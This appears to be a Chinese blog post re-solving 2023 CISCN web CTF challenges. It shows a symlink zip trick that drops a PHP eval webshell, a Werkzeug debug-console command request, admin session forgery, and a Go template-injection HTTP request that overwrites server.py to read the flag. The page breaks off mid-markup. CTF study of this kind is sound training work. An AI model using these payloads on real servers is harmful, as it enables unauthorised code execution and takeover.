<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>[2023CISCN]国赛初赛WEB题目复现 | Lanb0's blog|一个默默无闻的网安爱好者</title><meta name="author" content="lanb0"><meta name="copyright" content="lanb0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最近几个月在学免杀，JAVA安全以及JS相关内容，导致CTF摆了很久，这次复现国赛题目就当做恢复训练了  Unzip文件上传界面，随便上传个文件，回显了源码 12345678910&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo &#x3D; finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($f">
<meta property="og:type" content="article">
<meta property="og:title" content="[2023CISCN]国赛初赛WEB题目复现">
<meta property="og:url" content="https://wustzhb.github.io/2023/10/23/[2023CISCN]%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Lanb0&#39;s blog|一个默默无闻的网安爱好者">
<meta property="og:description" content="最近几个月在学免杀，JAVA安全以及JS相关内容，导致CTF摆了很久，这次复现国赛题目就当做恢复训练了  Unzip文件上传界面，随便上传个文件，回显了源码 12345678910&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo &#x3D; finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($f">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wustzhb.github.io/img/head.jpg">
<meta property="article:published_time" content="2023-10-23T10:00:00.000Z">
<meta property="article:modified_time" content="2023-10-23T14:57:24.775Z">
<meta property="article:author" content="lanb0">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="CISCN">
<meta property="article:tag" content="WEB安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wustzhb.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://wustzhb.github.io/2023/10/23/[2023CISCN]%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '[2023CISCN]国赛初赛WEB题目复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-23 22:57:24'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">27</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于博主</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/index_img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Lanb0's blog|一个默默无闻的网安爱好者"><span class="site-name">Lanb0's blog|一个默默无闻的网安爱好者</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于博主</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">[2023CISCN]国赛初赛WEB题目复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-23T10:00:00.000Z" title="发表于 2023-10-23 18:00:00">2023-10-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-23T14:57:24.775Z" title="更新于 2023-10-23 22:57:24">2023-10-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/">CTF</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>最近几个月在学免杀，JAVA安全以及JS相关内容，导致CTF摆了很久，这次复现国赛题目就当做恢复训练了</p>
</blockquote>
<h2 id="Unzip"><a href="#Unzip" class="headerlink" title="Unzip"></a>Unzip</h2><p>文件上传界面，随便上传个文件，回显了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this!</span></span><br></pre></td></tr></table></figure>

<p>程序逻辑是进入到&#x2F;tmp里，解压我们上传的文件。那么可以上传一个带有一句话木马的zip包，然后解压，但是要考虑到如何让其解压到我们可以访问的目录下。</p>
<p>尝试通过修改压缩包中的文件名来实现路径穿越</p>
<p>准备设置文件名为<code>../a</code>，这里提前设置正常文件名为4个字符，就不用动压缩包的其他部分了</p>
<img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20231012_2.png" style="zoom: 67%;" />

<p>传到虚拟机里尝试解压，触发了告警忽略了<code>../</code>，说明此路不通</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20231012_3.png"></p>
<p>查找资料，发现有一篇文章中的题目考察了unzip相关内容</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10533#toc-4">2021深育杯线上初赛官方WriteUp - 先知社区</a></p>
<p>利用思路很巧妙，他是先上传一个zip，其中压缩了一个链接到&#x2F;var&#x2F;www&#x2F;html的软链接test。然后，再上传一个zip，这次的zip中含有一个正常的文件夹test，里面有一句话木马的php文件。</p>
<p>第一次解压，会在tmp目录下产生一个软链接test。在第二次解压时，因为存在同名的文件(软链接test和正常文件夹test)，此时解压程序会将test文件夹中的文件试图解压到已经存在的test中，而这个已经存在的test指向了&#x2F;var&#x2F;www&#x2F;html，所以实际的解压位置就变成了&#x2F;var&#x2F;www&#x2F;html。(这个思路真的十分巧妙，这也是安全的魅力所在)</p>
<p>接下来就是照猫画虎。</p>
<p>第一步，构建软链接,打包上传</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /var/www/html mylink</span><br><span class="line">zip -y 1.zip mylink</span><br></pre></td></tr></table></figure>

<p>第二步，创建目录，编写一句话木马</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> mylink</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; mylink/1.php</span><br></pre></td></tr></table></figure>

<p>第三步，打包上传</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r 2.zip mylink </span><br></pre></td></tr></table></figure>

<p>后面就是getshell标准步骤</p>
<h1 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h1><p>给了3个路由，Index会给一个guest的cookie，Admin会调用pongo2引擎来渲染页面，猜测可能存在模板注入或者AST injection，这里先不管。</p>
<p>目光转向Flask路由，这个handler首先对session做验证，然后get本地的5000端口。</p>
<p>根据路由handler名字以及对应端口(flask默认端口为<code>5000</code>)猜测应该本地的<code>flask</code>的服务</p>
<p>尝试让服务端替我们访问debug页面<code>/console</code></p>
<p>输入url:<code>/flask?name=console</code>，发现开启了debug模式</p>
<img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20231013_1.png" style="zoom:67%;" />

<blockquote>
<p>这里无法输入pin码，所以伪造pin码这条路被堵死了。</p>
</blockquote>
<p>需要注意的是，<code>SECRET</code> 是一个由Werkzeug Debugge调试器生成的值。主要用于验证某些请求是否来自前端页面。和Flask内用于加密和验证session的key不同。</p>
<p>比如我们在交互式界面中输入了一行python代码，他实际会发送这样一个get请求，其中s就是<strong>SECRET</strong>变量</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console?&amp;__debugger__=yes&amp;cmd=os.popen(&quot;whoami&quot;).read()&amp;frm=0&amp;s=P8HZgYpd6yy8D9wrFnEO</span><br></pre></td></tr></table></figure>

<p>但是flask对这种可能产生越权的行为进行了session验证，所以这道题目考查的是flask session的伪造，只不过从以前的冒充admin变成了冒充一个知晓pin码的用户。</p>
<p>在这个输入pin码的界面，如果输入正确的pin码，服务端会给我们set一个cookie，我们要伪造的就是这个cookie</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20231013_2.png"></p>
<p>要伪造cookie，首先必须知道这个cookie是如何生成的，找到Werkzeug的库目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 show Werkzeug</span><br></pre></td></tr></table></figure>

<p>通过VSCODE的search功能，查找”<code>__wzd</code>“关键字，定位到了cookie生成代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>现在，让我们专注于<code>cookie_name</code>的生成过程：</p>
<ol>
<li><p><strong>初始化哈希对象</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = hashlib.sha1()</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>收集可能是公开的信息</strong>： 这些信息是用于确保每个应用或每个环境生成的cookie名称都是独特的，但这些信息可能是公开的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">codeprobably_public_bits = [</span><br><span class="line">     username,  <span class="comment"># 当前的系统用户名</span></span><br><span class="line">     modname,  <span class="comment"># 应用模块的名称</span></span><br><span class="line">     <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),  <span class="comment"># 应用的名称</span></span><br><span class="line">     <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),  <span class="comment"># 应用模块的文件位置</span></span><br><span class="line"> ]</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>收集私有信息</strong>： 这些信息被视为更加私有，并且不太可能在没有验证的调试页面中被公开。这增加了攻击者猜测cookie名称的难度。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br></pre></td></tr></table></figure>

<p>其中<code>uuid.getnode()</code>返回机器的硬件地址（MAC地址），而<code>get_machine_id()</code>返回特定于平台的唯一ID。</p>
</li>
<li><p><strong>哈希所有的信息</strong>: 将所有上述信息串联并进行哈希，得到一个SHA1哈希值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">codefor bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">     <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">         bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">     h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里，<code>chain(probably_public_bits, private_bits)</code>函数将公开信息和私有信息合并为一个序列，然后这个序列中的每一项都被加入到哈希中。</p>
<p><code>h.update(b&quot;cookiesalt&quot;)</code>添加了一个额外的“salt”值，以确保最终的哈希值是独特的。</p>
</li>
<li><p><strong>生成cookie名称</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>将哈希值转换为16进制的字符串形式，并从中取出前20个字符。然后，它前面添加了”__wzd”前缀来生成最终的<code>cookie_name</code>。</p>
</li>
</ol>
<p>再通过查找<code>cookie_name</code>关键字，找到<code>set_cookie</code>方法</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20231013_3.png"></p>
<p>通过观察可知，cookie的值是通过时间戳+pin码的hash，由”|”符号拼接而来的</p>
<p>再去看看验证逻辑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_pin_trust</span>(<span class="params">self, environ: WSGIEnvironment</span>) -&gt; <span class="built_in">bool</span> | <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Checks if the request passed the pin test.  This returns `True` if the</span></span><br><span class="line"><span class="string">    request is trusted on a pin/cookie basis and returns `False` if not.</span></span><br><span class="line"><span class="string">    Additionally if the cookie&#x27;s stored pin hash is wrong it will return</span></span><br><span class="line"><span class="string">    `None` so that appropriate action can be taken.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> self.pin <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    val = parse_cookie(environ).get(self.pin_cookie_name)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> val <span class="keyword">or</span> <span class="string">&quot;|&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> val:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ts_str, pin_hash = val.split(<span class="string">&quot;|&quot;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ts = <span class="built_in">int</span>(ts_str)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pin_hash != hash_pin(self.pin):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> (time.time() - PIN_TIME) &lt; ts</span><br></pre></td></tr></table></figure>

<p>不难看出，由于时间戳是明文，所以伪造一个大一点的时间戳即可绕过检验。因为hash算法就在代码里，所以下后面就是如何找出伪造pin码的几个要素。</p>
<p>一般来说，需要通过报错来获取信息，但是不管对name怎么fuzz，由于传参限制都无法报错。看了其他师傅的wp后才发现，可以使得name参数为空来报错。。。。</p>
<p>报错信息中，有用的除了一些路径外,值得注意的是这几行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">&quot;/app/server.py&quot;</span>, line <span class="number">7</span>, <span class="keyword">in</span> index</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>无法ssti，也没什么用。</p>
<p>又坐牢了一段时间，无奈之下又只能瞅一瞅师傅们的wp，好家伙，原来<code>SESSION_KEY</code>是空的，逗人玩呢。</p>
<p>那就修改一下Admin的路由，用来获取admin的session</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br></pre></td></tr></table></figure>

<p>拿着伪造的session去访问靶机的admin路由，提示我们用ssti，那就ssti</p>
<p>经过检验确实存在ssti，但这里不是python的ssti，是go的ssti，网上大多提到了<code>&#123;&#123;.&#125;&#125;</code>来获取全局变量，但对这道题来说没什么用</p>
<p>换个思路，既然ssti是代码执行的话，那就用go来进行RCE不就行了</p>
<p>但是<code>xssWaf := html.EscapeString(name)</code>会转义引号，所以payload里不能用引号，寻找思路类似于<code>PHP的无字母数字RCE</code></p>
<p>**前面通过session伪造pin的思路不对或者太麻烦(因为没找到能不用引号的payload)**，思路转换为替换server.py文件，需要用到以下几个方法:</p>
<p><strong>c.SaveUploadedFile(file *multipart.FileHeader, dst string)</strong></p>
<blockquote>
<p>保存上传的文件</p>
</blockquote>
<p><strong>c.FormFile(name string)</strong></p>
<blockquote>
<p>获取上传的文件</p>
</blockquote>
<p><strong>c.HandlerName()</strong></p>
<blockquote>
<p>获取正在处理的路由的处理函数名称,这里为main.Admin</p>
</blockquote>
<p><strong>c.Request.Referer()</strong>:</p>
<blockquote>
<p>获取Referer头</p>
</blockquote>
<p>构造以下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.SaveUploadedFile(c.FormFile(c.HandlerName()),c.Request.Referer())</span><br></pre></td></tr></table></figure>

<p>最终HTTP请求体</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?name=%7b%7bc.SaveUploadedFile(c.FormFile(c.HandlerName())%2cc.Request.Referer())%7d%7d</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d5d0420f-1268-449d-a3df-00307c395edd.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>/app/server.py</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session-name=MTY5NzE4NjkzMHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwInXwlMhNgf5c-RWJSULVMGWSUrousqud2c8o96O0sDQ==;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=AaB03x</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>408</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--AaB03x</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;main/route.Admin&quot;; filename=&quot;server.py&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">app = Flask(__name__)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@app.route(<span class="string">&#x27;/a&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span></span><br><span class="line"><span class="language-pgsql">def read_file_content():</span></span><br><span class="line"><span class="language-pgsql">		</span></span><br><span class="line"><span class="language-pgsql">    <span class="keyword">return</span> os.popen(&quot;cat /th1s_1s_f13g&quot;).<span class="keyword">read</span>()</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span></span><br><span class="line"><span class="language-pgsql">    app.run(&quot;0.0.0.0&quot;,<span class="number">5000</span>,<span class="keyword">debug</span>=<span class="keyword">True</span>)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span 